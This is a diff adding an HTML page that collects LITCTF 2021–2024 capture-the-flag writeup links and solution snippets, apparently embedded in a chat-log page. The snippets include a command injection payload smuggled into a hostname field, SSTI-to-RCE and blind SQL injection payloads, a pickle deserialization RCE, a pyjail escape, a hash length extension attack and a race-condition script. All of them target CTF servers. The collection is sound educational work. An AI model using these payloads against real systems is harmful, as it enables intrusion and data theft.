+                <li><a href="https://thr34dr1pp3r.gitbook.io/ctf/litctf-2024" target="_blank" rel="noopener noreferrer">thr34dr1pp3r's GitBook (Crypto)</a></li>
+                <li><a href="https://hostileninja72.github.io/litcrypto/" target="_blank" rel="noopener noreferrer">hostileninja72's Crypto Writeups</a></li>
+                <li><a href="https://liminova.github.io/blog/litctf-2024-kuwahara" target="_blank" rel="noopener noreferrer">liminova's Blog on Kuwahara</a></li>
+                <li>Video: <a href="https://www.youtube.com/watch?v=KwTDsmyoMqg" target="_blank" rel="noopener noreferrer">https://www.youtube.com/watch?v=KwTDsmyoMqg</a></li>
+                <li>Video: <a href="https://youtu.be/db7Md3IkVpQ?si=QDgbzXxmeivWkStH" target="_blank" rel="noopener noreferrer">https://youtu.be/db7Md3IkVpQ?si=QDgbzXxmeivWkStH</a></li>
+            </ul>
+        </div>
+    </div>
+    
+    <!-- LITCTF 2023 -->
+    <div id="litctf2023">
+        <h2>LITCTF 2023</h2>
+        <div class="category-container">
+            <h3>Writeup Contest Winners</h3>
+            <ul>
+                <li><strong>Most Well-written and Unique:</strong> Crypto/YourDidIt! - <a href="https://tinyurl.com/litctf23" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                <li><strong>Web:</strong> Art Contest - <a href="https://blog.junron.dev/writeups/web/art-contest.html" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                <li><strong>Crypto:</strong> YourDidIt! - <a href="https://demo.hedgedoc.org/s/iourDE12Y" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                <li><strong>Rev:</strong> Squish - <a href="https://github.com/cewau/ctf-writeups/blob/main/20230805-litctf/REV_squish.md" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                <li><strong>Pwn:</strong> Stiller printf - <a href="https://eth007.me/blog/ctf/stiller-printf/" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+            </ul>
+            <h4>Honorary Mentions</h4>
+            <ul>
+                <li><strong>Web/Amogsus API:</strong> <a href="https://github.com/secyber/LITCTF23/blob/main/(web)%20amogsus-api.md" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                <li><strong>Crypto/The Door to the Xord:</strong> <a href="https://tinyurl.com/LlTCTF23" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                <li><strong>Rev/Budget MC:</strong> <a href="https://github.com/programmeruser2/ctf-solutions/tree/main/litctf/2023/budget-mc" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                <li><strong>Misc/wow its another pyjail:</strong> <a href="https://github.com/abhishekg999/CTFWriteups/tree/main/LITCTF/wow%20its%20another%20pyjail" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+            </ul>
+        </div>
+        <div class="category-container">
+            <h3>Challenge Solutions &amp; Techniques</h3>
+            <div class="challenge-item">
+                <h4>Misc/Geoguessr</h4>
+                <blockquote>
+                    A detailed walkthrough of identifying a location near Boston. The process involved analyzing blurry road signs (Interstate 287 and 87), using OpenStreetMap to check road layouts and lane counts, and finally using Google Maps Street View to pinpoint the exact gantry.
+                    <br><strong>Location:</strong> <a href="https://www.google.com/maps/@41.0764417,-73.9205859,3a,90y,180.79h,96.08t/data=!3m6!1e1!3m4!1srBpYPPUh0SWeEt8AP1zF9Q!2e0!7i16384!8i8192?entry=ttu" target="_blank" rel="noopener noreferrer">Google Maps Link</a>
+                </blockquote>
+            </div>
+            <div class="challenge-item">
+                <h4>Race Condition Exploit (Donation Challenge)</h4>
+                <p>Multiple scripts were used to exploit a race condition, allowing for a large number of donation requests to be sent concurrently to manipulate an account balance.</p>
+                <p>JavaScript (Fetch API):</p>
+                <pre><code>async function sendRequests() {
+  const firstSetPromises = Array.from({ length: 5 }, () => donate("90071992547409.91"));
+  const secondSetPromises = Array.from({ length: 1 }, () => donate("1048576.09"));
+  const allPromises = [...firstSetPromises, ...secondSetPromises];
+  try {
+    const responses = await Promise.all(allPromises);
+    console.log(responses);
+  } catch (error) {
+    console.error(error);
+  }
+}</code></pre>
+                <p>Python (aiohttp):</p>
+                <pre><code>import asyncio
+from aiohttp import ClientSession
+
+async def run(r):
+    url = "http://34.130.180.82:57344/api/donate"
+    tasks = []
+    sem = asyncio.Semaphore(1000)
+    async with ClientSession() as session:
+        for i in range(r):
+            task = asyncio.ensure_future(bound_fetch(sem, url, session))
+            tasks.append(task)
+        responses = asyncio.gather(*tasks)
+        await responses</code></pre>
+            </div>
+            <div class="challenge-item">
+                <h4>Time-based Blind Command Injection</h4>
+                <p>A Python script using the <code>requests</code> library to exfiltrate a flag character by character by inducing a time delay with <code>sleep</code> if a <code>grep</code> command matches.</p>
+                <pre><code>import requests, time, string
+charset = string.ascii_letters + string.digits + "_{}?!"
+url = "http://34.130.180.82:55922/"
+flag = "LITCTF{"
+while True:
+    for c in charset:
+        payload = f'a ; cat flag.txt | grep "{flag + c}" && sleep 1'
+        start = time.time()
+        res = requests.post(url, data={"hostname": payload})
+        end = time.time()
+        if end - start > 1:
+            flag += c
+            break</code></pre>
+            </div>
+             <div class="challenge-item">
+                <h4>obligatory-pyjail</h4>
+                <p>A complex one-liner to bypass a pyjail environment by using <code>_posixsubprocess.fork_exec</code> to execute <code>cat flag.txt</code>.</p>
+                <pre><code>__import__("_posixsubprocess").fork_exec(['cat', 'flag.txt'], (b'/bin/cat',), True, (7,), None, None, -1, -1, __import__("os").pipe()[0], 5, -1, -1, __import__("os").pipe()[0], 7, True, False, None, None, None, -1, None)+print(__import__("os").read(4, 1000).decode())</code></pre>
+            </div>
+            <div class="challenge-item">
+                <h4>Leaderboard-service</h4>
+                <p>A script exploiting a hash length extension vulnerability using the <code>hlextend</code> library.</p>
+                <pre><code>import requests, hlextend
+from Crypto.Util.number import *
+
+given = bytes.fromhex("52f390327e474539272454557b543f2d4980214072321d49df4be364a330c7")
+for i in range(256):
+    full_hash = (long_to_bytes(i) + given).hex()
+    sha = hlextend.new("sha256")
+    add = "0000000000000000000000000000000a" + sha.extend(b'lmao', b'', 16, full_hash).hex()
+    new_hash = sha.hexdigest()
+    url = "http://litctf.org:31773/getf?table=flag_table&hash=" + new_hash + "&id=" + add
+    rep = requests.get(url)
+    if "ERR" not in rep.text:
+        print(url)</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- LITCTF 2022 -->
+    <div id="litctf2022">
+        <h2>LITCTF 2022</h2>
+        <div class="category-container">
+            <h3>Writeup Contest Winners</h3>
+            <ul>
+                <li><strong>Crypto:</strong> Misery Straightener - <a href="https://hackmd.io/nHC4BN66QgGUMfS3MaKLtg?view" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                <li><strong>Misc:</strong> Rythm's Double Identity - <a href="https://maxniederman.com/posts/ctf/lit-2022/rythm/" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                <li><strong>Pwn:</strong> House of Cockarocha - <a href="https://piers-n.github.io/post/lit-ctf-2022-writeup/" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                <li><strong>Rev:</strong> You Know The Rules And So Do I - <a href="https://sahuang.github.io/writeups/litctf-2022/" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+                <li><strong>Web:</strong> Imgurbage - <a href="https://github.com/zazolcgeslajazn/writeups/blob/main/LITCTF-2022/web/imgurbage.md" target="_blank" rel="noopener noreferrer">Writeup</a></li>
+            </ul>
+        </div>
+        <div class="category-container">
+            <h3>Challenge Solutions &amp; Techniques</h3>
+            <div class="challenge-item">
+                <h4>Web/Flushed Emoji</h4>
+                <blockquote>
+                    An intricate multi-stage exploit chain:
+                    <ol>
+                        <li>Exploit a Server-Side Template Injection (SSTI) vulnerability to achieve Remote Code Execution (RCE).</li>
+                        <li>The server environment lacked common networking tools (<code>wget</code>, <code>curl</code>, etc.).</li>
+                        <li>The solution was to use the available Python <code>requests</code> library from within the SSTI payload.</li>
+                        <li>Use <code>requests</code> to attack an adjacent web server vulnerable to a boolean-based blind SQL injection.</li>
+                        <li>A complex one-liner payload was crafted to bypass character filters (e.g., periods) and handle multiple layers of string escaping.</li>
+                    </ol>
+                </blockquote>
+                <p>Final payload to brute-force the flag:</p>
+                <pre><code>username=test&password={{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('python3+-c+"exec(\'import+requests;print(requests\x2epost(\\"http://172\\x2e24\\x2e0\\x2e8:8080/runquery\\",json={\\"username\\":\\"\\x27+OR+(SELECT+COUNT(password)+FROM+users+WHERE+username=\\x27flag\\x27+AND+password+LIKE+\\x27LITCTF{\\x25\\x27)=1--\\",\\"password\\":\\"test\\"})\x2etext)\')"')['read']()}}</code></pre>
+            </div>
+            <div class="challenge-item">
+                <h4>Misc/Geoguessr (Warm-up, Normal, Hard)</h4>
+                <ul>
+                    <li><strong>Warm-up:</strong> Identified Gibraltar by recognizing a British pub sign ("Arms") and Bass beer logo in a southern European climate.</li>
+                    <li><strong>Normal:</strong> Identified Macau from signs written in both Portuguese and Chinese, then located the specific skyscraper to approximate the viewpoint.</li>
+                    <li><strong>Hard:</strong> Identified a French-speaking African nation from "Hotel de Ville," Pan-African colors, and vegetation. Google Lens on a cropped image confirmed Tambacounda, Senegal.</li>
+                </ul>
+            </div>
+            <div class="challenge-item">
+                <h4>EmeraldBlock's 36 Writeups</h4>
+                <p>A massive contribution of 36 writeups for nearly every challenge in LITCTF 2022.</p>
+                <ul>
+                    <li><strong>Main Repository:</strong> <a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups" target="_blank" rel="noopener noreferrer">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    
+    <!-- LITCTF 2021 -->
+    <div id="litctf2021">
+        <h2>LITCTF 2021</h2>
+        <div class="category-container">
+            <h3>Web</h3>
+            <div class="challenge-item">
+                <h4>AlexFanClub</h4>
+                <p>SQL Injection using tab characters (<code>%09</code>) to bypass filters.</p>
+                <pre><code>?param='%09UNION%09SELECT%09sql%09FROM%09sqlite_master%09WHERE%09sql%09LIKE%09'
+?param='%09UNION%09SELECT%09flag_column%09FROM%09flag_is_in_here%09WHERE%09flag_column%09LIKE%09'</code></pre>
+            </div>
+            <div class="challenge-item">
+                <h4>Flask of pickles</h4>
+                <p>Remote Code Execution via Python pickle deserialization.</p>
+                <pre><code>import base64, pickle
+class RCE:
+    def __reduce__(self):
+        import subprocess
+        return subprocess.check_output, (['grep','-r','fla','/'],)
+
+x = {"name":"test","bio":RCE()}
+payload = base64.b64encode(pickle.dumps(x))
+print(payload)</code></pre>
+            </div>
+            <div class="challenge-item">
+                <h4>AlexFanClubApi</h4>
+                <p>A time-based XXE (XML External Entity) attack. The solution involves a binary search to find the correct timestamp that allows the external entity (<code>/flag.txt</code>) to be read.</p>
+                <ul>
+                    <li><strong>Detailed Writeup:</strong> <a href="https://github.com/letronghoangminh/CTF-Writeups/tree/master/Web/LITCTF%202021%20-%20Alex%20Fan%20Club%20API%20(500)" target="_blank" rel="noopener noreferrer">https://github.com/letronghoangminh/CTF-Writeups/...</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="category-container">
+            <h3>Cryptography (crypto)</h3>
+            <div class="challenge-item">
+                <h4>merkle_heavenwoman &amp; leftovers</h4>
+                <ul>
+                    <li><strong>merkle_heavenwoman solver:</strong> <a href="https://github.com/qpwoeirut/CTFs/blob/master/LITCTF/2021/crypto/merkle_heavenwoman/solve_merkle_heavenwoman.py" target="_blank" rel="noopener noreferrer">solve_merkle_heavenwoman.py</a></li>
+                    <li><strong>leftovers solver:</strong> <a href="https://github.com/qpwoeirut/CTFs/blob/master/LITCTF/2021/crypto/leftovers/Leftovers/solve_leftovers.py" target="_blank" rel="noopener noreferrer">solve_leftovers.py</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="category-container">
+            <h3>General LITCTF 2021 Writeups</h3>
+            <ul>
+                <li><a href="https://sebastianpc.fun/writeups/2021/LITCTF" target="_blank" rel="noopener noreferrer">sebastianpc.fun Writeups</a></li>
+                <li><a href="https://github.com/datajerk/ctf-write-ups/tree/master/litctf2021" target="_blank" rel="noopener noreferrer">datajerk's CTF Writeups</a></li>
+                <li><a href="https://github.com/SuperStormer/writeups/tree/master/litctf_2021" target="_blank" rel="noopener noreferrer">SuperStormer's Writeups</a></li>
+                <li><a href="https://github.com/LexMACS/LIT-CTF-2021" target="_blank" rel="noopener noreferrer">Official Source Code Repo</a></li>
+            </ul>
+        </div>
+    </div>
+
+</body>
+</html>
+```
+  </section>
+  <script>
+    // Force chat to start at the bottom (newest messages)
+    const chat = document.getElementById("chat");
+    chat.scrollTop = chat.scrollHeight;
+  </script>
+</body>
+</html>
